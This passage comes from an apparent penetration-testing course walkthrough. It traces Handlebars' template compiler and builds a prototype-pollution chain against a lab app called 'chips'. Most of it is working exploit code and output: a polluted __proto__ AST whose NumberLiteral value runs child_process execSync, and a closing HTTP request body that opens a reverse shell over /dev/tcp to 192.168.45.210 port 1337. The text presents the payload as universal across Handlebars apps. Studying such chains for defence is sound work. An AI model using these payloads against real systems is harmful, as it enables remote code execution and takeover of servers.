485    var ast = env.parse(input, options),
486        environment = new env.Compiler().compile(ast, options);
487    return new env.JavaScriptCompiler().compile(environment, options);
488  }
```
The `precompile` function will first check if the input is the expected type and initialize the options object. The input will be parsed on line 485 using the same parse function we reviewed above. Remember, the input will not be modified if we pass in AST objects. The function will then compile the AST to generate the opcodes using the compile function on line 486. Finally, the function will compile the opcodes into JavaScript code on line 487. The source code for the `Compiler().compile` function can be found in `compiler/compiler.js` while the `JavaScriptCompiler().compile` function can be found in the `compiler/javascript-compiler.js`.

Let's try generating JavaScript using this `precompile` function.

```javascript
> precompiled = Handlebars.precompile(ast)
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    var helper, lookupProperty = container.lookupProperty || function(parent, propertyName) {\n' +
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' +
  '          return parent[propertyName];\n' +
  '        }\n' +
  '        return undefined\n' +
  '    };\n' +
  '\n' +
  '  return "hello "\n' +
  '    + container.escapeExpression(((helper = (helper = lookupProperty(helpers,"foo") || (depth0 != null ? lookupProperty(depth0,"foo") : depth0)) != null ? helper : container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != null ? depth0 : (container.nullContext || {}),{"name":"foo","hash":{},"data":data,"loc":{"start":{"line":1,"column":6},"end":{"line":1,"column":15}}}) : helper)));\n' +  
  '},"useData":true}'
```
The JavaScript output contains the string `"hello "` and the code to lookup and append the `foo` variable.

There is no native implementation that lets us print the generated operation codes (opcodes). However, this process will be important for the RCE and we will later debug this process to understand how the AST is processed into opcodes. For now, it's important to know that before the AST is compiled into JavaScript code, it is first converted into an array of opcodes that instruct the compiler how to generate the final JavaScript code.

Let's create a function to execute this template to demonstrate the completed lifecycle of a template.
```javascript
> eval("compiled = " + precompiled)
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true }

> hello = Handlebars.template(compiled)
[Function: ret] {
  isTop: true,
  _setup: [Function (anonymous)],
  _child: [Function (anonymous)]
}

> hello({"foo": "student"})
'hello student'
```
We use the `eval` function to convert the string to a usable object. This is only necessary because we used the `precompile` function. We can use the `compile` function, but this returns the executable function instead of the string, which would help clarify the compilation process. Next, we generate the actual template function by using the `Handlebars.template` function. This returns another function, which renders the template when executed (and provided with the necessary data).

Now that we understand how a template is rendered, let's review how we can abuse it with prototype pollution. We'll begin by determining if the target is running Handlebars and later we will focus on RCE.

Let's start by working backwards in the template generation process. The farther in the process that we find the injection point, the higher the likelihood that our injection will have a noticeable difference in the output. This is because we give the library less time to overwrite or change our modifications, or simply crash. For this reason, we'll start by reviewing the `compiler/javascript-compiler.js` file.

In the review, we find the `appendContent` function, which seems interesting.

```javascript
369    // [appendContent]
370    //
371    // On stack, before: ...
372    // On stack, after: ...
373    //
374    // Appends the string value of `content` to the current buffer
375    appendContent: function appendContent(content) {
376      if (this.pendingContent) {
377        content = this.pendingContent + content;
378      } else {
379        this.pendingLocation = this.source.currentLocation;
380      }
381
382      this.pendingContent = content;
383    },
```
A function like this seems perfect for prototype pollution. A potentially unset variable (`this.pendingContent`) is appended to an existing variable (`content`). Now we just need to understand how the function is called. A search through the source code reveals that it's used in `compiler/compiler.js`.

```javascript
228    ContentStatement: function ContentStatement(content) {
229      if (content.value) {
230        this.opcode('appendContent', content.value);
231      }
232    },
```
As discussed earlier, Handlebars will create an AST, create the opcodes, and convert the opcodes to JavaScript code. The function in Listing 78 instructs the compiler how to create opcodes for a `ContentStatement`. If there is a value in the content, it will call the `appendContent` function and pass in the content.

Let's review the AST of our input template to determine if we have a `ContentStatement`.

```javascript
{
  type: 'Program',
  body: [
    {
      type: 'ContentStatement',
      original: 'hello ',
      value: 'hello ',
      loc: [SourceLocation]
    },
    {
      type: 'MustacheStatement',
      path: [Object],
      params: [],
      hash: undefined,
      escaped: true,
      strip: [Object],
      loc: [SourceLocation]
    }
  ],
  strip: {},
  loc: {
    source: undefined,
    start: { line: 1, column: 0 },
    end: { line: 1, column: 17 }
  }
}
```

The `ContentStatement` represents the static text in a template, like "hello " in this case. While it's not mandatory, most templates include one for usefulness. As a result, injecting into `pendingContent` will almost always add content to the template.

Let's attempt to exploit this in our interactive CLI and then later exploit it using an HTTP request.

```javascript
> {}.__proto__.pendingContent = "haxhaxhax"
'haxhaxhax'

> precompiled = Handlebars.precompile(ast)
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    var helper, lookupProperty = container.lookupProperty || function(parent, propertyName) {\n' +
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' +
  '          return parent[propertyName];\n' +
  '        }\n' +
  '        return undefined\n' +
  '    };\n' +
  '\n' +
  '  return "haxhaxhaxhello "\n' +
  '    + container.escapeExpression(((helper = (helper = lookupProperty(helpers,"foo") || (depth0 != null ? lookupProperty(depth0,"foo") : depth0)) != null ? helper : container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != null ? depth0 : (container.nullContext || {}),{"name":"foo","hash":{},"data":data,"loc":{"start":{"line":1,"column":6},"end":{"line":1,"column":15}}}) : helper)));\n' +  
  '},"useData":true}'
  
> eval("compiled = " + precompiled)
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true }

> hello = Handlebars.template(compiled)
[Function: ret] {
  isTop: true,
  _setup: [Function (anonymous)],
  _child: [Function (anonymous)]
}

> hello({"foo": "student"})
'haxhaxhaxhello student'
```

The "haxhaxhax" string was included in the compiled code and the final output. Now, let's set this using an HTTP request.

```json
{
  "connection": {
    "type": "rdp",
    "settings": {
      "hostname": "rdesktop",
      "username": "abc",
      "password": "abc",
      "port": "3389",
      "security": "any",
      "ignore-cert": "true",
      "client-name": "",
      "console": "false",
      "initial-program": "",
      "__proto__": {
        "pendingContent": "haxhaxhax"
      }
    }
  }
}

```
With `pendingContent` set in the encrypted value, let's send the request to `/guaclite` and exploit the prototype pollution.

At this point, we have a method to detect if the target is running Handlebars if we don't have access to the source code. While this is useful in blackbox targets, this is also useful for whitebox testing to help determine if a library is used when we can't figure out how or where it is used.

Now that we've exploited the prototype pollution to inject content, let's take it to the next level and obtain RCE.

</details>

### Handlebars — Remote Code Execution
With our detection mechanism working, let's attempt to execute code in Handlebars. Before we begin, we will restart the application since the prototype is polluted from the previous section.

```bash
student@chips:~/chips$ docker-compose down
Stopping chips_chips_1 ... done
Stopping rdesktop      ... done
Stopping guacd         ... done
Removing chips_chips_1 ... done
Removing rdesktop      ... done
Removing guacd         ... done
Removing network chips_default
student@chips:~/chips$ TEMPLATING_ENGINE=hbs docker-compose -f ~/chips/docker-compose.yml up
...
```

While it might seem that we could use the `pendingContent` exploit that we found earlier to add JavaScript code to the compiled object, it's actually not possible. **The content that's added to `pendingContent` is escaped, preventing us from injecting JavaScript**.

```javascript
> Handlebars = require("handlebars")
...

> {}.__proto__.pendingContent = "singleQuote: ' DoubleQuote: \" "
`singleQuote: ' DoubleQuote: " `

> Handlebars.precompile("Hello {{ foo }}")
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    var helper, lookupProperty = container.lookupProperty || function(parent, propertyName) {\n' +
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' +
  '          return parent[propertyName];\n' +
  '        }\n' +
  '        return undefined\n' +
  '    };\n' +
  '\n' +
  `  return "singleQuote: ' DoubleQuote: \\" Hello "\n` +
  '    + container.escapeExpression(((helper = (helper = lookupProperty(helpers,"foo") || (depth0 != null ? lookupProperty(depth0,"foo") : depth0)) != null ? helper : container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != null ? depth0 : (container.nullContext || {}),{"name":"foo","hash":{},"data":data,"loc":{"start":{"line":1,"column":6},"end":{"line":1,"column":15}}}) : helper)));\n' +  
  '},"useData":true}'
```

Let's investigate how and why the content is escaped to find a way to bypass it. As a reminder, we'll review the `appendContent` function in `compiler/javascript-compiler.js`.
```javascript
375  appendContent: function appendContent(content) {
376    if (this.pendingContent) {
377      content = this.pendingContent + content;
378    } else {
379      this.pendingLocation = this.source.currentLocation;
380    }
381  
382    this.pendingContent = content;
383  },
```
The `appendContent` function will append to the content if `pendingContent` is set. At the end of the function, it sets `this.pendingContent` to the concatenated content. If we search the rest of `compiler/javascript-compiler.js` for `"pendingContent"` we find that it's `"pushed"` via the `pushSource` function.

```javascript
881  pushSource: function pushSource(source) {
882    if (this.pendingContent) {
883      this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
884      this.pendingContent = undefined;
885    }
886
887    if (source) {
888      this.source.push(source);
889    }
890  },
```
If `this.pendingContent` is set, `this.source.push` pushes the content. However, the content is first passed to `this.source.quotedString`. We can find the `quotedString` function in `compiler/code-gen.js`.

```javascript
118  quotedString: function quotedString(str) {
119    return '"' + (str + '').replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n').replace(/\r/g, '\\r').replace(/\u2028/g, '\\u2028') // Per Ecma-262 7.3 + 7.8.4
120    .replace(/\u2029/g, '\\u2029') + '"';
121  },
```

This is most likely the function that is escaping the quotes on `pendingContent`.

Since `pushSource` is used to add pending content, let's work backwards to find instances of calls to pushSource that may append the pending content. One of these instances is through the `appendEscaped` function in `compiler/javascript-compiler.js`.

```javascript
416  appendEscaped: function appendEscaped() {
417  this.pushSource(this.appendToBuffer([this.aliasable('container.escapeExpression'), '(', this.popStack(), ')']));
418  },
```

Working back farther, we find that `appendEscaped` is the `opcode` function that is mapped to the `MustacheStatement` node in the AST. This function is found in `compiler/compiler.js`.

```javascript
215  MustacheStatement: function MustacheStatement(mustache) {
216    this.SubExpression(mustache);
217  
218    if (mustache.escaped && !this.options.noEscape) {
219      this.opcode('appendEscaped');
220    } else {
221      this.opcode('append');
222    }
223  },
```
In summary, when Handlebars builds the AST, it converts the template into tokens based on content type. For example, the template `hello {{ foo }}` becomes a `ContentStatement` for "hello " and a `MustacheStatement` for the `{{ foo }}` expression.

```javascript
> ast = Handlebars.parse("hello {{ foo }}")
{
  type: 'Program',
  body: [
    {
      type: 'ContentStatement',
      original: 'hello ',
      value: 'hello ',
      loc: [SourceLocation]
    },
    {
      type: 'MustacheStatement',
      path: [Object],
      params: [],
      hash: undefined,
      escaped: true,
      strip: [Object],
      loc: [SourceLocation]
    }
  ],
  strip: {},
  loc: {
    source: undefined,
    start: { line: 1, column: 0 },
    end: { line: 1, column: 17 }
  }
}
```

In order to convert these statements into JavaScript code, they are mapped to functions that dictate how to append the content to the compiled template. The `appendEscaped` function.

In order to exploit Handlebars, we could search for a statement that pushes content without escaping it. We could then review the types of components that may be added to Handlebars templates to find something that we can use. These components can be found in `compiler/compiler.js`.

```javascript
...
215    MustacheStatement: function MustacheStatement(mustache) {
...
223    },
...
228    ContentStatement: function ContentStatement(content) {
...
232    },
233
234    CommentStatement: function CommentStatement() {},
...
309
310    StringLiteral: function StringLiteral(string) {
311      this.opcode('pushString', string.value);
312    },
313
314    NumberLiteral: function NumberLiteral(number) {
315      this.opcode('pushLiteral', number.value);
316    },
317
318    BooleanLiteral: function BooleanLiteral(bool) {
319      this.opcode('pushLiteral', bool.value);
320    },
321
322    UndefinedLiteral: function UndefinedLiteral() {
323      this.opcode('pushLiteral', 'undefined');
324    },
325
326    NullLiteral: function NullLiteral() {
327      this.opcode('pushLiteral', 'null');
328    },
...
```
Only some of the components are included in Listing 89 but they are all worth investigating.

In addition to the familiar `MustacheStatement` and `ContentStatement`, the AST also includes a `CommentStatement`, which, like regular comments, doesn’t generate any opcodes. It also supports various literal types: `StringLiteral`, `NumberLiteral`, `BooleanLiteral`, `UndefinedLiteral`, and `NullLiteral`.

`StringLiteral` uses the `pushString` opcode with the string value. Let's analyze this function in `compiler/javascript-compiler.js` starting on line 585.

```javascript
585  // [pushString]
586  //
587  // On stack, before: ...
588  // On stack, after: quotedString(string), ...
589  //
590  // Push a quoted version of `string` onto the stack
591  pushString: function pushString(string) {
592    this.pushStackLiteral(this.quotedString(string));
593  },
```
The code shows that `pushString` will also escape the quotes. This would not be a good target for us.

`NumberLiteral`, `BooleanLiteral`, `UndefinedLiteral`, and `NullLiteral` use the `pushLiteral opcode`. `NumberLiteral` and `BooleanLiteral` provide a variable, while `UndefinedLiteral` and `NullLiteral` provide a static value. Let's analyze how `pushLiteral` works. It can be found in `compiler/javascript-compiler.js` starting on line 595.

```javascript
595  // [pushLiteral]
596  //
597  // On stack, before: ...
598  // On stack, after: value, ...
599  //
600  // Pushes a value onto the stack. This operation prevents
601  // the compiler from creating a temporary variable to hold
602  // it.
603  pushLiteral: function pushLiteral(value) {
604    this.pushStackLiteral(value);
605  },
```

The `pushLiteral` function runs `pushStackLiteral` with the value. This function is also found in the same file.
```javascript
868  push: function push(expr) {
869    if (!(expr instanceof Literal)) {
870      expr = this.source.wrap(expr);
871    }
872
873    this.inlineStack.push(expr);
874    return expr;
875  },
876
877  pushStackLiteral: function pushStackLiteral(item) {
878    this.push(new Literal(item));
879  },
```
The `pushStackLiteral` and `push` functions don't escape values, which is key. If we can add a `NumberLiteral` or `BooleanLiteral` to the prototype with a command as its value, we may be able to inject it into the generated function—potentially leading to command execution when the template is rendered.

Let's investigate what a Handlebars NumberLiteral object might consist of. To do this, we'll use a modified test template that will create multiple types of block statements, expressions, and literals.

```json
{{someHelper "some string" 12345 true undefined null}}
```
This template calls a helper with five arguments—"some string", 12345, true, undefined, and null—creating corresponding `StringLiteral`, `NumberLiteral`, `BooleanLiteral`, `UndefinedLiteral`, and `NullLiteral` nodes in the AST. We can use this template to generate the AST and specifically access the `NumberLiteral` object.

```bash
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/c49bd34c-5a89-4f31-af27-388bc99daebe
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
> Handlebars = require("handlebars")
...
> ast = Handlebars.parse('{{someHelper "some string" 12345 true undefined null}}')
...
> ast.body[0].params[1]
{
  type: 'NumberLiteral',
  value: 12345,
  original: 12345,
  loc: SourceLocation {
    source: undefined,
    start: { line: 1, column: 27 },
    end: { line: 1, column: 32 }
  }
}
```

To access the `NumberLiteral` in the AST, we traverse the `body` array to the first element (a `MustacheStatement`), then access its `params` array. Since the number is the second argument, we retrieve the second item in `params`, which gives us the `NumberLiteral` object.

Let's generate the code to analyze how the number would be displayed in a function.
```javascript
> Handlebars.precompile(ast)
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    var lookupProperty = container.lookupProperty || function(parent, propertyName) {\n' +
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' +
  '          return parent[propertyName];\n' +
  '        }\n' +
  '        return undefined\n' +
  '    };\n' +
  '\n' +
  '  return container.escapeExpression((lookupProperty(helpers,"someHelper")||(depth0 && lookupProperty(depth0,"someHelper"))||container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}),"some string",12345,true,undefined,null,{"name":"someHelper","hash":{},"data":data,"loc":{"start":{"line":1,"column":0},"end":{"line":1,"column":54}}}));\n' +                                             
  '},"useData":true}'
```
Once precompiled, we can find `"12345"` within the generated code. If we were to use this as our injection point, we should understand where we are injecting. To do this, we'll format the return function in a more readable format.

```javascript
container.escapeExpression(
	(lookupProperty(helpers, "someHelper") ||
		(depth0 && lookupProperty(depth0, "someHelper")) ||
		container.hooks.helperMissing
	).call(
		depth0 != null ? depth0 : (container.nullContext || {}),
		"some string",
		12345,
		true,
		undefined,
		null,
		{
			"name": "someHelper",
			"hash": {},
			"data": data,
			"loc": {
				"start": {
					"line": 1,
					"column": 0
				},
				"end": {
					"line": 1,
					"column": 54
				}
			}
		}
	)
);
```
The number is passed as an argument to the `call` function, and since no extra escaping is needed for valid JavaScript, we can modify the number's value in the AST to execute `console.log`. We then precompile and render the template to test this injection.

```javascript
> ast.body[0].params[1].value = "console.log('haxhaxhax')"
"console.log('haxhaxhax')"

> precompiled = Handlebars.precompile(ast)
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    var lookupProperty = container.lookupProperty || function(parent, propertyName) {\n' +
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' +
  '          return parent[propertyName];\n' +
  '        }\n' +
  '        return undefined\n' +
  '    };\n' +
  '\n' +
  `  return container.escapeExpression((lookupProperty(helpers,"someHelper")||(depth0 && lookupProperty(depth0,"someHelper"))||container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}),"some string",console.log('haxhaxhax'),true,undefined,null,{"name":"someHelper","hash":{},"data":data,"loc":{"start":{"line":1,"column":0},"end":{"line":1,"column":54}}}));\n` +                          
  '},"useData":true}'
  
> eval("compiled = " + precompiled)
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true }

> tem = Handlebars.template(compiled)
...
> tem({})
haxhaxhax
Uncaught Error: Missing helper: "someHelper"
    at Object.<anonymous> (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/helpers/helper-missing.js:19:13)
    at Object.wrapper (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/internal/wrapHelper.js:15:19)
    at Object.main (eval at <anonymous> (REPL14:1:1), <anonymous>:9:156)
    at main (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/runtime.js:208:32)
    at ret (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/runtime.js:212:12) {
  description: undefined,
  fileName: undefined,
  lineNumber: undefined,
  endLineNumber: undefined,
  number: undefined
}
```
We replaced the `NumberLiteral` value with a `console.log` statement. After precompiling, the message appears where the number was, and when running the template, our code executes before an error is thrown. This confirms the injection works. The next step is to inject or create an AST containing a `NumberLiteral` with our custom value.

Earlier, we reviewed the `parseWithoutProcessing` function in `node_modules/handlebars/dist/cjs/handlebars/compiler/base.js`.

```javascript
...
33  function parseWithoutProcessing(input, options) {
34    // Just return if an already-compiled AST was passed in.
35    if (input.type === 'Program') {
36      return input;
37    }
38
39    _parser2['default'].yy = yy;
40
41    // Altering the shared object here, but this is ok as parser is a sync operation
42    yy.locInfo = function (locInfo) {
43      return new yy.SourceLocation(options && options.srcName, locInfo);
44    };
45
46    var ast = _parser2['default'].parse(input);
47
48    return ast;
49  }
```
At line 35, the library checks if the input is already compiled by looking at `input.type`. If a raw string is passed, `input.type` is undefined, so it checks the string prototype. By setting the `type` property on the object prototype to `'Program'`, we can trick Handlebars into treating any input as an AST. This allows us to inject a custom AST into the prototype that executes our desired commands. We'll set `type` to `'Program'`, then iteratively fix any resulting errors in the prototype until the template compiles successfully.

```javascript
> {}.__proto__.type = "Program"
'Program'

> Handlebars.parse("hello {{ foo }}")
Uncaught TypeError: Cannot read property 'length' of undefined
    at WhitespaceControl.Program (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/compiler/whitespace-control.js:26:28)
    at WhitespaceControl.accept (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/compiler/visitor.js:72:32)
    at HandlebarsEnvironment.parse (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:55:16)
```
We'll start debugging in Visual Studio Code with the CLI. We'll also check the `✅ Caught Exceptions` and `✅ Uncaught Exceptions` breakpoints so the debugger can immediately jump to the code that is causing the issue.

When we parse the template again, an exception is caught on line 26 of `compiler/whitespace-control.js`.

```javascript
25    var body = program.body;
26    for (var i = 0, l = body.length; i < l; i++) {
27      var current = body[i],
28          strip = this.accept(current);
...
70    }
```

The application threw an exception because the function expected an AST with a body but the function received a string instead. When the application attempted to access the `length` property, an error was thrown. We can disconnect the debugger to continue the application, set the body to an empty array in the prototype, and try again.

```javascript
> {}.__proto__.body = []

> Handlebars.parse("hello {{ foo }}")
'hello {{ foo }}'

> Handlebars.precompile("hello {{ foo }}")
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    return "";\n' +
  '},"useData":true}'
```

With an empty array as the body, no exception is thrown and the string is returned as-is. Also, when we attempt to precompile it, a fairly empty function is provided. While this is progress, it's not particularly helpful. Let's generate a simple template with only a `MustacheStatement` and review what the value of the `body` variable is.

```javascript
> delete {}.__proto__.type
true

> delete {}.__proto__.body
true

> ast = Handlebars.parse("{{ foo }}")
...
> ast.body
[
  {
    type: 'MustacheStatement',
    path: {
      type: 'PathExpression',
      data: false,
      depth: 0,
      parts: [Array],
      original: 'foo',
      loc: [SourceLocation]
    },
    params: [],
    hash: undefined,
    escaped: true,
    strip: { open: false, close: false },
    loc: SourceLocation {
      source: undefined,
      start: [Object],
      end: [Object]
    }
  }
]
>
```

It's very possible that we may need all the values from this object; however, it's best to start with a simple example and proceed from there. We'll first add an object to our body with a type variable set to `"MustacheStatement"`. Then, we'll set the object prototype and start the debugger. Once connected, we'll run `parse` and `precompile`.

```javascript
> {}.__proto__.type = "Program"
'Program'

> {}.__proto__.body = [{type: 'MustacheStatement'}]
[ { type: 'MustacheStatement' } ]
> Debugger attached.

> Handlebars.parse("hello {{ foo }}")
'hello {{ foo }}'

> Handlebars.precompile("hello {{ foo }}")
Uncaught TypeError: Cannot read property 'parts' of undefined
...
```
As shown, parsing did not throw an error, but `precompiling` did. Our debugger caught the exception and we find that it is thrown on line 552 of `compiler/compiler.js`.

```javascript
551  function transformLiteralToPath(sexpr) {
552    if (!sexpr.path.parts) {
553      var literal = sexpr.path;
554      // Casting to string here to make false and 0 literal values play nicely with the rest
555      // of the system.
556      sexpr.path = {
557        type: 'PathExpression',
558        data: false,
559        depth: 0,
560        parts: [literal.original + ''],
561        original: literal.original + '',
562        loc: literal.loc
563      };
564    }
565  }
```
The error `"Cannot read property 'parts' of undefined"` occurs because `body.path` is undefined, and JavaScript can't access `parts` on an undefined value. To fix this, there's no need to recreate the whole `body.path` object—just set `body.path` to something (e.g., `"0"` in the prototype). Before doing this, the debugger must be disconnected.

```javascript
> {}.__proto__.body = [{type: 'MustacheStatement', path:0}]
[ { type: 'MustacheStatement', path: 0 } ]

> Handlebars.precompile("hello {{ foo }}")
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    var stack1, helper, lookupProperty = container.lookupProperty || function(parent, propertyName) {\n' +
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' +
  '          return parent[propertyName];\n' +
  '        }\n' +
  '        return undefined\n' +
  '    };\n' +
  '\n' +
  '  return ((stack1 = ((helper = (helper = lookupProperty(helpers,"undefined") || (depth0 != null ? lookupProperty(depth0,"undefined") : depth0)) != null ? helper : container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != null ? depth0 : (container.nullContext || {}),{"name":"undefined","hash":{},"data":data,"loc":}) : helper))) != null ? stack1 : "");\n' +                                  
  '},"useData":true}'
```
Setting the `path` variable to `"0"` and precompiling the template returns a function as a string, which initially looks like a minimal valid payload. However, a closer look reveals that the `loc` variable isn’t correctly set, and executing the function would result in a syntax error.

The `loc` variable was also found in the body of the legitimate AST that we generated earlier.

```javascript
> delete {}.__proto__.type
true

> delete {}.__proto__.body
true

> ast = Handlebars.parse("{{ foo }}")
...
> ast.body
[
  {
    type: 'MustacheStatement',
...
    loc: SourceLocation {
      source: undefined,
      start: [Object],
      end: [Object]
    }
  }
]
> 
```
Again, we'll start with the minimum variables set and add additional ones as needed. We'll set the `loc` variable to 0 and adjust accordingly if needed.

```javascript
> {}.__proto__.type = "Program"
'Program'

> {}.__proto__.body = [{type: 'MustacheStatement', path:0, loc: 0}]
[ { type: 'MustacheStatement', path: 0, loc: 0 } ]

> precompiled = Handlebars.precompile("hello {{ foo }}")
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    var stack1, helper, lookupProperty = container.lookupProperty || function(parent, propertyName) {\n' +
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' +
  '          return parent[propertyName];\n' +
  '        }\n' +
  '        return undefined\n' +
  '    };\n' +
  '\n' +
  '  return ((stack1 = ((helper = (helper = lookupProperty(helpers,"undefined") || (depth0 != null ? lookupProperty(depth0,"undefined") : depth0)) != null ? helper : container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != null ? depth0 : (container.nullContext || {}),{"name":"undefined","hash":{},"data":data,"loc":0}) : helper))) != null ? stack1 : "");\n' +                                 
  '},"useData":true}'
  
> eval("compiled = " + precompiled)
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true }

> tem = Handlebars.template(compiled)
[Function: ret] {
  isTop: true,
  _setup: [Function (anonymous)],
  _child: [Function (anonymous)]
}
> tem()
''
```

At this stage, the template compiles, imports, and executes without errors—but produces no output, as the `MustacheStatement` is still empty. The next step is to add a `NumberLiteral` parameter to it. We'll base this on the structure of the previously generated `NumberLiteral` object.

```json
{
  type: 'NumberLiteral',
  value: 12345,
  original: 12345,
  loc: SourceLocation {
    source: undefined,
    start: { line: 1, column: 27 },
    end: { line: 1, column: 32 }
  }
}
```
We'll begin with the minimal setup and add more fields as needed. To create a valid `NumberLiteral`, we must set the `type` to indicate it's a `NumberLiteral` and include the `value` we want to inject. This object will be placed in the `params` array of the `MustacheStatement`.

```json
[
	{
		type: 'MustacheStatement', 
		path:0, 
		loc: 0, 
		params: [ 
			{ 
				type: 'NumberLiteral', 
				value: "console.log('haxhaxhax')" 
			} 
		]
	}
]
```

This shows the value that we will be using to set in the body variable within the Object prototype.
```javascript
> {}.__proto__.body = [{type: 'MustacheStatement', path:0, loc: 0, params: [ { type: 'NumberLiteral', value: "console.log('haxhaxhax')" } ]}]
[
  { type: 'MustacheStatement', path: 0, loc: 0, params: [ [Object] ] }
]

> precompiled = Handlebars.precompile("hello {{ foo }}")
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    var stack1, lookupProperty = container.lookupProperty || function(parent, propertyName) {\n' +
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' +
  '          return parent[propertyName];\n' +
  '        }\n' +
  '        return undefined\n' +
  '    };\n' +
  '\n' +
  `  return ((stack1 = (lookupProperty(helpers,"undefined")||(depth0 && lookupProperty(depth0,"undefined"))||container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}),console.log('haxhaxhax'),{"name":"undefined","hash":{},"data":data,"loc":0})) != null ? stack1 : "");\n` +                                                                                                                   
  '},"useData":true}'
```
At this point, the value is added to the compiled function. Now, let's try to execute the function and verify that our payload is being executed.

```javascript
> eval("compiled = " + precompiled)
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true }

> tem = Handlebars.template(compiled)
[Function: ret] {
  isTop: true,
  _setup: [Function (anonymous)],
  _child: [Function (anonymous)]
}

> tem()
haxhaxhax
Uncaught Error: Missing helper: "undefined"
    at Object.<anonymous> (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/helpers/helper-missing.js:19:13)
    at Object.wrapper (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/internal/wrapHelper.js:15:19)
    at Object.main (eval at <anonymous> (REPL183:1:1), <anonymous>:9:138)
    at main (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/runtime.js:208:32)
    at ret (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/runtime.js:212:12) {
  description: undefined,
  fileName: undefined,
  lineNumber: undefined,
  endLineNumber: undefined,
  number: undefined
}
```

Although we received an error, our `console.log` statement executed!

Next, we need to apply the principles learned here to exploit the target application with an HTTP request. We'll modify the request payload to include the information we added to the prototype on the CLI.
json
```
"__proto__": 
{
  "type": "Program",
  "body":[
    {
      "type": "MustacheStatement",
      "path":0,
      "loc": 0,
      "params":[
        {
          "type": "NumberLiteral",
          "value": "console.log(process.mainModule.require('child_process').execSync('whoami').toString())" 
        } 
      ]
    }
  ]
}
```
We'll use an exploit payload that will print out the current user running the application. We'll use this payload in BurpSuite.

When we send the request, we'll use the token in the response to create a connection.

As before, the prototype is polluted towards the end of the request. To trigger it, we need to load a new page.

Sending a GET request to the root generates an error. However, the docker-compose console includes the user that is running the application in the container (root).

```bash
chips_1     | root
chips_1     | 
chips_1     | root
chips_1     | 
chips_1     | GET / 500 39.494 ms - 1152
chips_1     | Error: /usr/src/app/views/hbs/error.hbs: Missing helper: "undefined"
...
```
Excellent! We have polluted the prototype to gain RCE on the application! This payload should be universal in other applications that use the Handlebars library.

#### Obtaining Reverse Shell
Send this request to `POST` `http://chips/token`
```json
{
  "connection": {
    "type": "rdp",
    "settings": {
      "hostname": "rdesktop",
      "username": "abc",
      "password": "abc",
      "port": "3389",
      "security": "any",
      "ignore-cert": "true",
      "client-name": "",
      "console": "false",
      "initial-program": "",
      "__proto__": {
        "type": "Program",
        "body": [
          {
            "type": "MustacheStatement",
            "path": 0,
            "loc": 0,
            "params": [
              {
                "type": "NumberLiteral",
                "value": "console.log(process.mainModule.require('child_process').execSync('bash -c \"exec bash -i &>/dev/tcp/192.168.45.210/1337 <&1\"').toString())"
              }
            ]
          }
        ]
      }
    }
  }
}
```
Obtain the token and send it to `http://chips/rdp?token=`
```text
